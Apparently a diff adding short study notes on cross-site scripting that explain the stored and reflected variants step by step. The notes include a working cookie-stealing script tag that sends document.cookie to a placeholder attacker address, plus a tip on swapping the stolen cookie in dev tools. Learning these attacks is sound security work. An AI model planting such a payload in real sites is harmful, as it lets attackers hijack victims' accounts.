@@ -1,0 +1,34 @@
+-XSS (cross-site Scripting): a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victims machine
+-vulnerable web app: uses unsanitized user input
+-javascript, VBScript, Flash and CSS
+-Two categories: Persistent/stored and Reflected
+-Possible attacks: Cookie stealing, keylogging, webcam snapshot, phishing, port scanning, other browser related exploits
+
+--------------------------------------------------------------------------------------------------------
+
+Stored XSS
+-malicious string originates from the websites database
+-web app allows user input that is not sanitized
+1. Attacker inserts malicious payload into the web app's database
+2. For every visit to the website the malicious script is activated
+3. data such as cookie, is stolen and sent to attacker to take over victim's account
+*script runs in every browser because it is stored in the database
+
+log cookie: <script>document.location='http://IP'+document.cookie</script>
+dev tools > storage > change cookie value 
+
+----------------------------------------------------------------------------------------
+
+Reflected XSS
+
+-malicious payload is part of the victims request to the website
+-website included this payload in response back to the user
+-attacker needs to trick a victim to click a URL
+-requires the victim to send a request containing an attackers payload
+-use social-engineering to trick victims to click link
+
+1. attacker sends a link to victim that contains a malicious payload
+2. victim clicks link and taken to vuln website
+3. link containing the attacker's script is executed on website
+4. attacker's script sends data back to the attacker, taking over victims account
+ 
